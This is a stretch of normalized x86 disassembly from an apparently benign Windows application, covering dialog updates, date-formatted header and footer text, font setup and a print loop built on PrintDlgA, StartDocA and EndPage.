mov ecx eax
xor eax eax
cdq
idiv ebp
add eax edi
lea edi [ eax + ecx ]
mov ecx [ esp + 0x14 ]
cmp ecx esi
jge r-xdata
cmp ebp 0x2
je r-xdata
mov eax [ esp + 0x34 ]
mov ax [ eax + ecx * 2 + 0x2 ]
inc ecx
test ah 0x7f
je r-xdata
inc [ esp + 0x10 ]
mov ebp [ esp + 0x44 ]
dec ecx
mov [ esp + 0x14 ] ecx
mov ebx ecx
jmp r-xdata
mov [ esp + 0x18 ] ebx
jmp r-xdata
dec ebp
mov [ esp + 0x10 ] ebp
mov edx [ esp + 0x34 ]
mov ax [ edx + ecx * 2 ]
test ah 0x7f
jne r-xdata
cmp ax 0x9
je r-xdata
movzx esi ax
mov eax [ esp + 0x54 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x48 ]
add edi [ ecx + esi * 4 ]
cmp esi 0x20
jne r-xdata
mov eax [ esp + 0x40 ]
mov ecx [ esp + 0x3c ]
push esi
push eax
mov eax [ esp + 0x38 ]
lea edx [ edi + ecx ]
push edx
push eax
call sub_413c30
add esp 0x10
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x38 ]
inc ecx
cmp ecx eax
mov [ esp + 0x14 ] ecx
jl r-xdata
mov edx [ esp + 0x18 ]
lea ecx [ edx + ebx ]
mov eax ecx
cdq
idiv ebp
mov ebp [ esp + 0x10 ]
mov esi eax
mov eax [ esp + 0x18 ]
cdq
idiv [ esp + 0x10 ]
mov [ esp + 0x18 ] ecx
sub esi eax
add edi esi
sub_423060
mov eax [ esp + 0x8 ]
sub eax 0x110
push ebx
push esi
push edi
je r-xdata
mov edi [ rw-data ]
mov ebx [ esp + 0x10 ]
xor esi esi
mov [ rw-data ] 0x1
call sub_4226c0
mov edi [ rw-data ]
add edi 0x14
mov esi 0xa
call sub_4226c0
mov al [ rw-data ]
neg al
sbb eax eax
add eax 0x160
push eax
call sub_420ca0
mov esi [ SetDlgItemTextA@IAT ]
add esp 0x4
push eax
push 0x4f3
push ebx
call esi
mov cl [ rw-data ]
neg cl
sbb ecx ecx
add ecx 0x160
push ecx
call sub_420ca0
add esp 0x4
push eax
push 0x4fd
push ebx
call esi
pop edi
pop esi
mov [ rw-data ] 0x0
mov eax 0x1
pop ebx
retn 0x10
dec eax
je r-xdata
movzx eax [ esp + 0x18 ]
sub eax 0x4f2
push ebp
mov ebp [ esp + 0x14 ]
je r-xdata
sub eax 0x2f0
je r-xdata
mov ebx [ rw-data ]
push ebp
mov eax 0xa
mov [ rw-data ] 0x1
call sub_422620
mov edi [ rw-data ]
add esp 0x4
xor esi esi
mov ebx ebp
call sub_4226c0
mov [ rw-data ] 0x0
jmp r-xdata
sub eax 0xa
jne r-xdata
mov esi [ esp + 0x10 ]
mov ebx [ rw-data ]
push esi
xor eax eax
call sub_422620
mov ebx [ rw-data ]
add ebx 0x14
push esi
mov eax 0xa
call sub_422620
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x10
pop edi
pop esi
xor eax eax
pop ebx
retn 0x10
mov ebx [ rw-data ]
push ebp
xor eax eax
call sub_422620
mov ebx [ rw-data ]
add ebx 0x14
push ebp
mov eax 0xa
call sub_422620
mov ecx [ rw-data ]
add esp 0x8
push 0x1
call sub_422b70
mov esi [ SetDlgItemInt@IAT ]
push eax
push 0x4f4
push ebp
call esi
mov ecx [ rw-data ]
push 0x1
add ecx 0x14
call sub_422b70
push eax
push 0x4fe
push ebp
call esi
mov al [ rw-data ]
test al al
jne r-xdata
mov ebx [ rw-data ]
push ebp
xor eax eax
mov [ rw-data ] 0x1
call sub_422620
mov edi [ rw-data ]
add esp 0x4
mov esi 0xa
mov ebx ebp
call sub_4226c0
mov [ rw-data ] 0x0
jmp r-xdata
pop ebp
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x10
sub_423230
push 0xffffffff
push sub_431e4b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x90
push ebx
push ebp
push esi
mov ebx ecx
push edi
lea ecx [ esp + 0x14 ]
call sub_4227d0
mov dl [ ebx + 0xa9 ]
lea esi [ ebx + 0x94 ]
mov ecx 0x5
lea edi [ esp + 0x14 ]
[ edi ] [ esi ]
lea eax [ esp + 0x14 ]
mov ecx 0x5
mov esi rw-data
lea edi [ esp + 0x28 ]
[ edi ] [ esi ]
mov cl [ ebx + 0xa8 ]
mov [ rw-data ] eax
mov al [ rw-data ]
push 0xffffffff
mov [ esp + 0x95 ] cl
push rw-data
lea ecx [ esp + 0x88 ]
mov [ esp + 0xb0 ] 0x0
mov [ esp + 0x98 ] dl
mov [ esp + 0x9a ] al
call sub_420550
push 0xffffffff
push rw-data
lea ecx [ esp + 0x8c ]
call sub_420550
push 0xffffffff
push rw-data
lea ecx [ esp + 0x90 ]
call sub_420550
push 0xffffffff
push rw-data
lea ecx [ esp + 0x94 ]
call sub_420550
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x94 ] ecx
mov [ esp + 0x98 ] edx
lea edi [ esp + 0x6c ]
lea esi [ ebx + 0xac ]
mov ebp 0x5
lea ebx [ ebx ]
mov eax [ esi ]
push 0xffffffff
push eax
mov ecx edi
call sub_420550
add esi 0x4
add edi 0x4
dec ebp
jne r-xdata
lea edi [ esp + 0x3c ]
lea esi [ ebx + 0xc0 ]
mov [ esp + 0x10 ] 0x4
mov ecx [ esi ]
push 0xffffffff
push ecx
mov ecx edi
call sub_420550
add esi 0x4
add edi 0x4
dec ebp
jne r-xdata
dec [ esp + 0x10 ]
jne r-xdata
mov ebp 0x3
lea esp [ esp ]
push rw-data
push 0x3a7
call sub_4215d0
add esp 0x8
test eax eax
je r-xdata
lea ecx [ esp + 0x14 ]
mov [ esp + 0xa8 ] 0xffffffff
call sub_422850
mov ecx [ esp + 0xa0 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x9c
retn
mov ecx ebx
call sub_40ea70
mov dl [ esp + 0x91 ]
mov al [ esp + 0x90 ]
mov ecx 0x5
lea esi [ esp + 0x14 ]
lea edi [ ebx + 0x94 ]
[ edi ] [ esi ]
mov ecx 0x5
lea esi [ esp + 0x28 ]
mov edi rw-data
[ edi ] [ esi ]
mov cl [ esp + 0x92 ]
mov [ ebx + 0xa8 ] dl
mov [ ebx + 0xa9 ] al
push 0x14
mov [ rw-data ] cl
push rw-data
lea ecx [ esp + 0x88 ]
call sub_421030
push 0x14
push rw-data
lea ecx [ esp + 0x8c ]
call sub_421030
push 0xa
push rw-data
lea ecx [ esp + 0x90 ]
call sub_421030
push 0xa
push rw-data
lea ecx [ esp + 0x94 ]
call sub_421030
mov edx [ esp + 0x94 ]
mov eax [ esp + 0x98 ]
mov [ rw-data ] edx
mov [ rw-data ] eax
lea esi [ esp + 0x6c ]
lea edi [ ebx + 0xac ]
mov ebp 0x5
push esi
mov ecx edi
call sub_4205b0
add esi 0x4
add edi 0x4
dec ebp
jne r-xdata
lea esi [ esp + 0x3c ]
lea edi [ ebx + 0xc0 ]
mov [ esp + 0x10 ] 0x4
jmp r-xdata
mov ebp 0x3
push esi
mov ecx edi
call sub_4205b0
add esi 0x4
add edi 0x4
dec ebp
jne r-xdata
dec [ esp + 0x10 ]
jne r-xdata
mov ecx ebx
call sub_4113e0
sub_4234d0
mov eax [ esp + 0x8 ]
sub esp 0x64
push esi
test eax eax
mov esi ecx
mov eax r--data
jne r-xdata
mov ecx [ esp + 0x6c ]
push ecx
push eax
lea edx [ esp + 0xc ]
push edx
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ esp + 0x4 ]
push eax
mov ecx esi
call sub_422960
pop esi
add esp 0x64
retn 0x8
mov eax r--data
sub_423510
sub esp 0x10
push esi
push edi
mov edi [ esp + 0x1c ]
test edi edi
mov esi ecx
je r-xdata
pop edi
pop esi
add esp 0x10
retn 0x4
lea eax [ esp + 0x8 ]
push eax
call [ GetLocalTime@IAT ]
mov ax [ edi ]
test ax ax
je r-xdata
lea ebx [ ebx ]
movzx eax [ edi + 0x2 ]
add edi 0x2
add eax 0xffffffda
cmp eax 0x53
ja r-xdata
movzx ecx ax
push ecx
jmp r-xdata
push 0x26
mov ecx esi
call sub_422910
movzx edx [ edi ]
push edx
movzx edx [ eax + lookup_table_423678 ]
jmp [ edx * 4 + jump_table_423650 ]
mov ecx esi
call sub_422910
cmp ax 0x26
je r-xdata
cmp [ esp + 0x10 ] 0xc
mov eax rw-data
ja r-xdata
movzx eax [ esp + 0xe ]
push 0x0
push eax
mov ecx esi
call sub_4234d0
jmp r-xdata
movzx ecx [ esp + 0x10 ]
push 0x0
push ecx
mov ecx esi
call sub_4234d0
jmp r-xdata
mov ax [ esp + 0x10 ]
cmp ax 0xc
movzx eax ax
jbe r-xdata
movzx edx [ esp + 0xa ]
push 0x0
push edx
mov ecx esi
call sub_4234d0
jmp r-xdata
movzx eax [ esp + 0x12 ]
push 0x1
push eax
mov ecx esi
call sub_4234d0
jmp r-xdata
movzx ecx [ esp + 0x8 ]
push 0x0
push ecx
mov ecx esi
call sub_4234d0
jmp r-xdata
movzx eax [ esp + 0x8 ]
cdq
mov ecx 0x64
idiv ecx
push 0x1
mov ecx esi
push edx
call sub_4234d0
jmp r-xdata
push 0x26
jmp r-xdata
push eax
mov ecx esi
call sub_422930
jmp r-xdata
mov eax rw-data
mov ax [ edi + 0x2 ]
add edi 0x2
test ax ax
jne r-xdata
push 0x0
push eax
mov ecx esi
call sub_4234d0
jmp r-xdata
sub eax 0xc
sub_4236d0
sub esp 0x414
push ebx
push ebp
push esi
push edi
mov ebp ecx
push 0x200
lea ecx [ esp + 0x20 ]
mov [ esp + 0x1c ] ebp
call sub_4228f0
mov eax [ esp + 0x42c ]
mov edi [ esp + 0x434 ]
lea eax [ eax + eax * 2 + 0x30 ]
lea ecx [ ebp + eax * 4 ]
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x10 ] ecx
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
inc eax
add edx 0x4
cmp eax 0x3
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
jl r-xdata
mov ax [ esi ]
xor ebx ebx
test ax ax
mov [ esp + 0x420 ] ebx
je r-xdata
mov edx [ esp + 0x10 ]
mov esi [ edx ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x414
retn 0x18
movzx eax [ ebp + 0xa4 ]
mov ecx [ esp + 0x438 ]
mov edx [ esp + 0x430 ]
push 0x1
push 0x1
push eax
push ecx
mov ecx [ esp + 0x438 ]
push edi
push edx
push 0x0
push ebx
lea eax [ esp + 0x3c ]
push eax
push ecx
call sub_422e30
mov edx [ esp + 0x40 ]
movsx esi [ rw-data ]
movsx ecx [ edi + 0x14 ]
mov ebp eax
movzx eax [ edx + 0xa4 ]
mov edx [ esp + 0x460 ]
push 0x0
push 0x1
push eax
mov eax [ esp + 0x464 ]
push edx
movsx edx [ rw-data ]
add edx esi
imul edx ecx
push edi
push eax
mov eax 0x51eb851f
imul edx
mov eax edx
sar eax 0x5
mov edx eax
shr edx 0x1f
add eax edx
movsx edx [ edi + 0x26 ]
imul edx ecx
imul ecx esi
add eax edx
sub eax ebp
imul eax [ esp + 0x54 ]
cdq
sub eax edx
mov ebp eax
mov eax 0x51eb851f
imul ecx
mov ecx [ edi + 0x1c ]
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
sar ebp 0x1
sub ebp edx
mov edx [ esp + 0x468 ]
add ebp ecx
push ebp
push ebx
lea ecx [ esp + 0x64 ]
push ecx
push edx
call sub_422e30
mov ebp [ esp + 0x68 ]
add esp 0x50
cmp ax 0x26
je r-xdata
movzx ecx [ esi + 0x2 ]
add esi 0x2
push ecx
call sub_42a1a9
add eax 0xffffffda
add esp 0x4
cmp eax 0x2e
ja r-xdata
movzx eax ax
push eax
jmp r-xdata
push 0x26
lea ecx [ esp + 0x20 ]
call sub_422910
movzx edx [ esi ]
push edx
movzx edx [ eax + lookup_table_4239b0 ]
jmp [ edx * 4 + jump_table_423980 ]
lea ecx [ esp + 0x20 ]
call sub_422910
mov ebx [ esp + 0x420 ]
mov eax [ ebp + 0xb4 ]
push eax
lea ecx [ esp + 0x20 ]
call sub_422930
jmp r-xdata
mov ecx [ ebp + 0xbc ]
push ecx
lea ecx [ esp + 0x20 ]
call sub_422930
jmp r-xdata
push rw-data
lea ecx [ esp + 0x20 ]
call sub_423510
jmp r-xdata
mov edx [ ebp + 0x90 ]
push edx
lea ecx [ esp + 0x20 ]
call sub_422960
jmp r-xdata
mov eax [ ebp + 0xb8 ]
push eax
lea ecx [ esp + 0x20 ]
call sub_422930
jmp r-xdata
mov ecx [ ebp + 0xac ]
push ecx
lea ecx [ esp + 0x20 ]
call sub_422930
jmp r-xdata
mov edx [ ebp + 0x90 ]
push edx
call [ lstrlenA@IAT ]
dec eax
js r-xdata
mov eax [ ebp + 0xb0 ]
push eax
lea ecx [ esp + 0x20 ]
call sub_422930
jmp r-xdata
push rw-data
lea ecx [ esp + 0x20 ]
call sub_423510
jmp r-xdata
mov ecx [ esp + 0x43c ]
push 0x0
push ecx
lea ecx [ esp + 0x24 ]
call sub_4234d0
jmp r-xdata
push 0x26
jmp r-xdata
mov ax [ esi + 0x2 ]
add esi 0x2
test ax ax
jne r-xdata
mov ecx [ ebp + 0x90 ]
lea edx [ ecx + eax + 0x1 ]
push edx
lea ecx [ esp + 0x20 ]
call sub_422960
jmp r-xdata
mov ecx [ ebp + 0x90 ]
mov edi edi
dec eax
jns r-xdata
cmp [ ecx + eax ] 0x5c
je r-xdata
sub_4239e0
mov eax 0x1150
call sub_42a0c0
push ebx
push ebp
push esi
mov ebp ecx
push edi
lea ecx [ esp + 0x94 ]
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x24 ] 0x1
call sub_423020
mov edx [ rw-data ]
test edx edx
je r-xdata
mov edx [ rw-data ]
push 0x0
push 0x20
push 0x21
push edx
call sub_420e20
add esp 0x10
mov esi [ rw-data ]
test esi esi
je r-xdata
xor eax eax
mov ecx 0x10
lea edi [ esp + 0x34 ]
[ edi ]
mov ecx [ rw-data ]
stosw [ edi ]
mov eax [ rw-data ]
mov [ esp + 0x3c ] edx
xor edx edx
mov [ esp + 0x56 ] ecx
mov cl [ ebp + 0x44 ]
test cl cl
sete dl
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x1164 ]
test eax eax
mov [ esp + 0x34 ] 0x42
mov [ esp + 0x40 ] esi
lea edx [ edx + edx + 0x40102 ]
mov [ esp + 0x48 ] edx
je r-xdata
call sub_422c30
mov edi eax
test edi edi
je r-xdata
mov eax edx
or eax 0x40
mov [ esp + 0x48 ] eax
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1150
retn 0x4
lea esi [ ebp + 0x94 ]
push esi
push edi
lea ecx [ esp + 0x9c ]
call sub_422990
push edi
call [ DeleteDC@IAT ]
mov ecx esi
call sub_422b70
mov ecx ebp
mov [ ebp + 0x7e ] ax
call sub_40eea0
mov ecx [ ebp + 0x4c ]
mov esi [ ecx + 0x8 ]
movsx ebx [ esp + 0xaa ]
mov edi 0x1
mov [ esp + 0x10 ] 0x0
nop
movzx esi [ ebp + 0xa5 ]
call sub_422bf0
lea edx [ esp + 0x34 ]
push edx
call [ PrintDlgA@IAT ]
test eax eax
je r-xdata
cmp esi [ ebp + 0x20 ]
jne r-xdata
mov eax [ esp + 0x10 ]
xor edi edi
inc eax
mov [ esp + 0x18 ] edi
mov [ esp + 0x10 ] eax
test [ esp + 0x48 ] 0x2
jne r-xdata
cmp esi [ ebp + 0x34 ]
jne r-xdata
mov ax [ esp + 0x10 ]
mov [ esp + 0x4c ] ax
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x44 ]
mov eax [ esp + 0x3c ]
lea edi [ ebp + 0x94 ]
push edi
mov [ rw-data ] ecx
push edx
lea ecx [ esp + 0x9c ]
mov [ rw-data ] eax
call sub_422990
movzx ebx [ ebp + 0xa5 ]
xor esi esi
call sub_422bf0
mov [ ebp + 0xa5 ] al
movzx eax al
cmp ebx eax
je r-xdata
mov [ esp + 0x4c ] 0x1
mov [ esp + 0x4e ] 0x7fff
movsx edx [ ecx + 0x1c ]
imul edx ebx
mov eax 0x51eb851f
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esp + 0x18 ]
add eax edx
lea edx [ ebx + eax ]
mov [ esp + 0x18 ] eax
cmp edx [ esp + 0xa0 ]
jle r-xdata
mov dx [ esp + 0x10 ]
mov [ esp + 0x4e ] dx
push edi
call sub_422cb0
mov ecx [ esp + 0x48 ]
add esp 0x4
push edi
push ecx
lea ecx [ esp + 0x9c ]
call sub_422990
mov eax [ esp + 0x1164 ]
test eax eax
je r-xdata
mov ecx ebp
call sub_40ea70
mov esi [ esi + 0x8 ]
test esi esi
jne r-xdata
mov edi 0x1
mov ecx edi
call sub_422b70
mov ecx ebp
mov [ ebp + 0x7e ] ax
call sub_40eea0
mov ecx 0xf
xor eax eax
lea edi [ esp + 0xc0 ]
[ edi ]
mov edx [ esp + 0x44 ]
push edx
call [ DeleteDC@IAT ]
mov ecx ebp
call sub_4113e0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1150
retn 0x4
test edi edi
je r-xdata
jmp r-xdata
mov cl [ eax + rw-data ]
mov [ esp + eax + 0xdc ] cl
inc eax
test cl cl
jne r-xdata
movsx eax [ esp + 0xae ]
lea ecx [ esp + 0xc0 ]
neg eax
push ecx
mov [ esp + 0xc4 ] eax
call [ CreateFontIndirectA@IAT ]
test eax eax
mov [ esp + 0x28 ] eax
je r-xdata
mov ecx [ ecx ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x90 ]
push eax
push 0x24
push 0x1
call sub_421530
add esp 0xc
mov edx [ esp + 0x44 ]
push eax
push edx
call [ SelectObject@IAT ]
mov ecx [ esp + 0x44 ]
mov [ esp + 0x7c ] eax
lea eax [ esp + 0x560 ]
push eax
push 0xff
push 0x0
push ecx
call [ GetCharABCWidthsA@IAT ]
xor ecx ecx
lea eax [ esp + 0x564 ]
mov ax [ esp + 0x10 ]
mov [ esp + 0x52 ] ax
mov al [ ebp + 0x44 ]
test al al
mov [ esp + 0x50 ] 0x1
jne r-xdata
mov al [ ecx + 0x1e ]
test al al
mov esi [ ecx + 0x8 ]
je r-xdata
mov dx [ eax - 0x4 ]
add dx [ eax + 0x4 ]
add ecx 0x5
add dx [ eax ]
add eax 0x3c
movsx edx dx
mov [ esp + ecx * 4 + 0x14c ] edx
mov dx [ eax - 0x2c ]
add dx [ eax - 0x30 ]
add dx [ eax - 0x34 ]
movsx edx dx
mov [ esp + ecx * 4 + 0x150 ] edx
mov dx [ eax - 0x20 ]
add dx [ eax - 0x24 ]
add dx [ eax - 0x28 ]
movsx edx dx
mov [ esp + ecx * 4 + 0x154 ] edx
mov dx [ eax - 0x14 ]
add dx [ eax - 0x18 ]
add dx [ eax - 0x1c ]
movsx edx dx
mov [ esp + ecx * 4 + 0x158 ] edx
mov dx [ eax - 0x8 ]
add dx [ eax - 0xc ]
add dx [ eax - 0x10 ]
cmp ecx 0xff
movsx edx dx
mov [ esp + ecx * 4 + 0x15c ] edx
jl r-xdata
mov edx [ rw-data ]
mov ecx [ ebp + 0x90 ]
xor eax eax
mov [ esp + 0x80 ] eax
mov [ esp + 0x84 ] eax
mov [ esp + 0x88 ] eax
mov [ esp + 0x8c ] eax
push edx
mov [ esp + 0x94 ] eax
mov [ esp + 0x84 ] 0x14
mov [ esp + 0x88 ] ecx
call [ GlobalLock@IAT ]
movzx ecx [ eax + 0x4 ]
mov edx [ rw-data ]
push 0x0
add ecx eax
push edx
mov [ esp + 0x90 ] ecx
call [ EnableWindow@IAT ]
movzx eax [ rw-data ]
mov [ esp + 0x78 ] eax
mov al [ rw-data ]
test al al
jne r-xdata
mov cx [ esp + 0x10 ]
mov [ esp + 0x4c ] 0x1
mov [ esp + 0x4e ] cx
test esi esi
je r-xdata
mov edi 0x1
jmp r-xdata
mov ecx [ rw-data ]
push 0x0
push sub_422dd0
push ecx
push 0x394
mov [ rw-data ] 0x0
call sub_420cd0
mov edx [ ebp + 0x90 ]
add esp 0x10
push edx
push 0x514
push eax
mov [ rw-data ] eax
call [ SetDlgItemTextA@IAT ]
mov eax [ esp + 0x44 ]
push sub_422d40
push eax
call [ SetAbortProc@IAT ]
mov edx [ esp + 0x44 ]
lea ecx [ esp + 0x80 ]
push ecx
push edx
call [ StartDocA@IAT ]
test eax eax
jle r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov edx [ rw-data ]
push edx
call [ GlobalUnlock@IAT ]
mov ecx [ esp + 0x7c ]
mov edx [ esp + 0x44 ]
mov al [ esp + 0x78 ]
push ecx
push edx
mov [ rw-data ] al
call [ SelectObject@IAT ]
mov eax [ esp + 0x28 ]
push eax
call [ DeleteObject@IAT ]
mov ecx [ rw-data ]
push 0x1
push ecx
call [ EnableWindow@IAT ]
mov edx [ rw-data ]
push edx
call [ DestroyWindow@IAT ]
mov eax [ esp + 0x24 ]
test eax eax
mov [ rw-data ] 0x0
je r-xdata
test [ esp + 0x48 ] 0x1
je r-xdata
mov ecx [ esp + 0x44 ]
push ecx
call [ DeleteDC@IAT ]
mov ecx ebp
call sub_4113e0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1150
retn 0x4
mov eax [ ebp + 0x4c ]
mov edx [ eax + 0x8 ]
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0x14 ] edx
mov [ esp + 0x20 ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0x34 ]
mov [ esp + 0x10 ] eax
mov eax [ ebp + 0x20 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x20 ] ecx
jmp r-xdata
movzx edx [ esp + 0x4c ]
cmp ebx edx
jl r-xdata
inc ebx
push ebx
mov [ esp + 0x20 ] eax
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x100 ]
push 0x23
push eax
call sub_420b10
mov ecx [ rw-data ]
add esp 0xc
push eax
push 0x515
push ecx
call [ SetDlgItemTextA@IAT ]
movzx edx [ esp + 0x4c ]
cmp ebx edx
jl r-xdata
mov esi [ esp + 0x14 ]
mov [ esp + 0x30 ] eax
mov [ esp + 0x1c ] 0x1
xor ebx ebx
mov edx [ esp + 0x44 ]
push 0x0
push edx
call sub_422d40
cmp [ rw-data ] 0x0
jne r-xdata
mov edx [ esp + 0x10 ]
cmp esi [ edx + 0x8 ]
jne r-xdata
mov eax [ esp + 0x44 ]
push eax
call [ StartPage@IAT ]
test eax eax
jl r-xdata
mov edx [ esp + 0x44 ]
push edx
mov [ esp + 0x28 ] 0x0
call [ AbortDoc@IAT ]
jmp r-xdata
mov eax [ esp + 0x10 ]
movsx ecx [ eax + 0x1c ]
movsx edi [ esp + 0xaa ]
imul ecx edi
mov eax 0x51eb851f
imul ecx
mov eax [ esp + 0x18 ]
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
add eax edx
add edi eax
mov [ esp + 0x18 ] eax
cmp edi [ esp + 0xa0 ]
mov ecx 0x1
jle r-xdata
movzx ecx [ edx + 0x1f ]
movsx ecx [ edx + 0x21 ]
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x44 ]
push ecx
push edx
call [ SelectObject@IAT ]
mov al [ ebp + 0xa8 ]
test al al
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
mov [ esp + 0x14 ] esi
jne r-xdata
mov [ esp + 0x1c ] ecx
cmp esi [ esp + 0x30 ]
jne r-xdata
movsx edi [ ebp + 0x38 ]
mov [ esp + 0x14 ] edi
movsx eax [ esp + 0xa8 ]
mov edi [ edx + 0x10 ]
imul eax ecx
add eax [ esp + 0xb0 ]
mov ecx [ esi ]
lea ecx [ edi + ecx * 2 ]
mov edi [ esi + 0x4 ]
mov [ esp + 0x14 ] edi
cmp esi [ esp + 0x20 ]
jne r-xdata
mov al [ ebp + 0xa9 ]
test al al
je r-xdata
cmp ebx 0x1
je r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
cmp esi [ edx + 0xc ]
je r-xdata
movsx edx [ ebp + 0x24 ]
mov edi [ esp + 0x14 ]
sub edi edx
lea ecx [ ecx + edx * 2 ]
mov edx [ esp + 0x10 ]
mov [ esp + 0x14 ] edi
xor edi edi
test bl 0x1
jne r-xdata
mov ecx [ esp + 0x1c ]
xor eax eax
cmp ecx eax
je r-xdata
movzx edx [ esp + 0x4e ]
cmp ebx edx
jge r-xdata
mov eax [ esp + 0x44 ]
push eax
call [ EndPage@IAT ]
test eax eax
jl r-xdata
mov dl [ eax + 0x1e ]
test dl dl
mov esi [ eax + 0x8 ]
mov [ esp + 0x14 ] esi
je r-xdata
mov edx 0x1
cmp esi [ esp + 0x20 ]
je r-xdata
push ebx
lea eax [ esp + 0x164 ]
push eax
lea ecx [ esp + 0x9c ]
push ecx
movsx ecx [ rw-data ]
add ecx 0x64
imul ecx esi
mov eax 0x51eb851f
imul ecx
mov ecx [ esp + 0xc0 ]
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
sub ecx edx
mov edx [ esp + 0x50 ]
push ecx
push edi
push edx
mov ecx ebp
call sub_4236d0
push ebx
lea eax [ esp + 0x164 ]
push eax
lea ecx [ esp + 0x9c ]
push ecx
movsx ecx [ rw-data ]
imul ecx esi
mov eax 0x51eb851f
imul ecx
mov ecx [ esp + 0xac ]
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
add edx [ esp + 0xc0 ]
add edx ecx
mov ecx [ esp + 0x50 ]
push edx
lea eax [ edi + 0x2 ]
push eax
push ecx
mov ecx ebp
call sub_4236d0
dec [ esp + 0x2c ]
jne r-xdata
mov esi [ esp + 0x14 ]
mov edi 0x1
jmp r-xdata
movzx eax [ esp + 0x4c ]
cmp ebx eax
jl r-xdata
mov ecx [ esp + 0x44 ]
push ecx
call [ EndDoc@IAT ]
mov [ esp + 0x24 ] 0x0
test esi esi
je r-xdata
mov [ esp + 0x1c ] ecx
jmp r-xdata
xor edx edx
jmp r-xdata
movsx esi [ esp + 0xaa ]
mov [ esp + 0x2c ] 0x3
mov ecx [ esp + 0x44 ]
push ecx
call [ EndPage@IAT ]
test eax eax
jge r-xdata
mov eax [ eax ]
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
mov edi [ esp + 0x18 ]
push 0x0
push edx
movzx edx [ ebp + 0xa4 ]
push edx
lea edx [ esp + 0x16c ]
push edx
lea edx [ esp + 0xa4 ]
push edx
mov edx [ esp + 0xc8 ]
add edx edi
push edx
push eax
mov eax [ esp + 0x30 ]
push eax
push ecx
mov ecx [ esp + 0x68 ]
push ecx
call sub_422e30
mov eax [ esp + 0x48 ]
add esp 0x28
cmp esi eax
je r-xdata
jmp r-xdata
sub_424260
sub esp 0x18
push ebp
mov ebp [ esp + 0x20 ]
test ebp ebp
push esi
mov esi ecx
jne r-xdata
movsx eax [ rw-data ]
lea eax [ eax + eax * 2 ]
cdq
sub eax edx
push ebx
sar eax 0x1
mov [ esi ] ax
mov ecx [ rw-data ]
push edi
lea eax [ esp + 0x18 ]
push eax
push ecx
call [ GetClientRect@IAT ]
movsx eax [ esi ]
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x24 ]
push 0x1
push eax
add edx 0x2
push edx
sub ecx eax
inc ecx
push ecx
push 0xffffffff
push ebp
call [ MoveWindow@IAT ]
movsx ecx [ rw-data ]
mov eax 0x66666667
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
push ebp
mov [ esi + 0xc ] dx
call [ GetDC@IAT ]
push 0x64
mov edi eax
call sub_420ca0
add esp 0x4
lea ecx [ esp + 0x10 ]
mov ebx eax
push ecx
push ebx
call [ lstrlenA@IAT ]
push eax
push ebx
push edi
call [ GetTextExtentPoint32A@IAT ]
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x20 ]
sub edx eax
mov [ esp + 0x2c ] eax
lea eax [ esp + 0x10 ]
push eax
push ebx
mov [ esi + 0xe ] dx
call [ lstrlenA@IAT ]
dec eax
push eax
push ebx
push edi
call [ GetTextExtentPoint32A@IAT ]
mov cx [ esi + 0xe ]
add cx [ esp + 0x10 ]
push 0x68
mov [ esi + 0x16 ] cx
call sub_420ca0
add esp 0x4
lea edx [ esp + 0x10 ]
mov ebx eax
push edx
push ebx
call [ lstrlenA@IAT ]
push eax
push ebx
push edi
call [ GetTextExtentPoint32A@IAT ]
mov eax [ esp + 0x2c ]
cdq
sub eax edx
mov ebx eax
mov eax [ esp + 0x10 ]
xor ecx ecx
mov cx [ esi + 0xe ]
sar ebx 0x1
sub cx bx
push edi
push ebp
sub ecx eax
add eax ecx
mov [ esi + 0x18 ] ax
mov eax 0x55555556
imul [ esp + 0x34 ]
mov eax edx
shr eax 0x1f
mov [ esi + 0x10 ] cx
add edx eax
sub ecx ebx
mov [ esi + 0x14 ] dx
mov [ esi + 0x12 ] cx
call [ ReleaseDC@IAT ]
pop edi
pop ebx
mov ebp [ esi + 0x1c ]
test ebp ebp
je r-xdata
pop esi
pop ebp
add esp 0x18
retn 0x4
sub_4243b0
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x1c ]
push 0x1
push edi
mov esi ecx
call [ SetBkMode@IAT ]
mov cl [ rw-data ]
xor eax eax
test cl cl
setne al
push 0x3
add eax 0x64
push eax
call sub_420ca0
movsx ecx [ esi + 0xc ]
movsx edx [ esi + 0xe ]
mov ebp [ TextOutA@IAT ]
add esp 0x4
push eax
push ecx
push edx
push edi
call ebp
movzx eax [ rw-data ]
